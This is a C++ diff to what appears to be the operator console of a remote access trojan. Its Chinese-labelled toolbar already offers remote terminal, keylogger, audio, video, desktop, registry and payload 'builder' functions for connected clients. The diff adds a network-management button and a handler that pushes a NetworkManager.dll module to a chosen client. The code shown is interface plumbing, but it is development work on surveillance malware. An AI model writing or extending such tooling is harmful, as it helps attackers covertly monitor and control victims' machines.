@@ -35,6 +35,7 @@
 #include "UI/TerminalDialog.h"
 #include "UI/HistoryDialog.h"
 #include "UI/ProcessDialog.h"
+#include "UI/NetworkDialog.h"
 #include "UI/FileDialog.h"
 #include "UI/DesktopDialog.h"
 #include "UI/RegistryDialog.h"
@@ -100,23 +101,23 @@ void CreateMainToolbar(HWND hWnd) {
     SendMessage(g_hToolbar, TB_SETIMAGELIST, 0, (LPARAM)hImageList);
     
     int iconIds[] = {
-        IDI_TERMINAL, IDI_PROCESS, IDI_WINDOW, IDI_DESKTOP, IDI_FILE,
+        IDI_TERMINAL, IDI_PROCESS, IDI_NETWORK, IDI_WINDOW, IDI_DESKTOP, IDI_FILE,
         IDI_AUDIO, IDI_VIDEO, IDI_SERVICE, IDI_REGISTRY, IDI_KEYLOGGER,
         IDI_SETTINGS, IDI_HISTORY, IDI_BUILDER, IDI_HELP
     };
 
     const wchar_t* buttonTexts[] = {
-        L"终端", L"进程", L"窗口", L"桌面", L"文件",
+        L"终端", L"进程", L"网络", L"窗口", L"桌面", L"文件",
         L"语音", L"视频", L"服务", L"注册表", L"键盘记录",
         L"设置", L"历史主机", L"生成", L"帮助"
     };
     int ids[] = {
-        IDM_TERMINAL, IDM_PROCESS, IDM_WINDOW, IDM_DESKTOP, IDM_FILE,
+        IDM_TERMINAL, IDM_PROCESS, IDM_NETWORK, IDM_WINDOW, IDM_DESKTOP, IDM_FILE,
         IDM_AUDIO, IDM_VIDEO, IDM_SERVICE, IDM_REGISTRY, IDM_KEYLOGGER,
         IDM_SETTINGS, IDM_EXTEND_HISTORY, IDM_BUILDER, IDM_HELP
     };
 
-    for (int i = 0; i < 14; i++) {
+    for (int i = 0; i < 15; i++) {
         HICON hIcon = (HICON)LoadImageW(g_hInstance, MAKEINTRESOURCEW(iconIds[i]), IMAGE_ICON, 32, 32, LR_DEFAULTCOLOR);
         if (hIcon) {
             ImageList_AddIcon(hImageList, hIcon);
@@ -124,8 +125,8 @@ void CreateMainToolbar(HWND hWnd) {
         }
     }
 
-    TBBUTTON tbButtons[14];
-    for (int i = 0; i < 14; i++) {
+    TBBUTTON tbButtons[15];
+    for (int i = 0; i < 15; i++) {
         ZeroMemory(&tbButtons[i], sizeof(TBBUTTON));
         tbButtons[i].iBitmap = i;
         tbButtons[i].idCommand = ids[i];
@@ -133,7 +134,7 @@ void CreateMainToolbar(HWND hWnd) {
         tbButtons[i].fsStyle = BTNS_AUTOSIZE | BTNS_SHOWTEXT;
         tbButtons[i].iString = (INT_PTR)buttonTexts[i];
     }
-    SendMessage(g_hToolbar, TB_ADDBUTTONS, 14, (LPARAM)&tbButtons);
+    SendMessage(g_hToolbar, TB_ADDBUTTONS, 15, (LPARAM)&tbButtons);
     SendMessage(g_hToolbar, TB_AUTOSIZE, 0, 0);
 }
 
@@ -480,6 +481,27 @@ void HandleCommand(HWND hWnd, int id) {
                     
                     AddLog(L"操作", L"打开进程管理...");
                     SendModuleToClient(clientId, CMD_LOAD_MODULE, L"ProcessManager.dll", CMD_PROCESS_LIST);
+                }
+            }
+        }
+        break;
+    case IDM_NETWORK:
+        {
+            std::shared_ptr<Formidable::ConnectedClient> client;
+            {
+                std::lock_guard<std::mutex> lock(g_ClientsMutex);
+                if (g_Clients.count(clientId)) client = g_Clients[clientId];
+            }
+            if (client) {
+                if (client->hNetworkDlg && IsWindow(client->hNetworkDlg)) {
+                    ShowWindow(client->hNetworkDlg, SW_SHOW);
+                    SetForegroundWindow(client->hNetworkDlg);
+                } else {
+                    client->hNetworkDlg = UI::NetworkDialog::Show(hWnd, clientId);
+                    if (client->hNetworkDlg) ShowWindow(client->hNetworkDlg, SW_SHOW);
+                    
+                    AddLog(L"操作", L"打开网络管理...");
+                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"NetworkManager.dll", CMD_NETWORK_LIST);
                 }
             }
         }
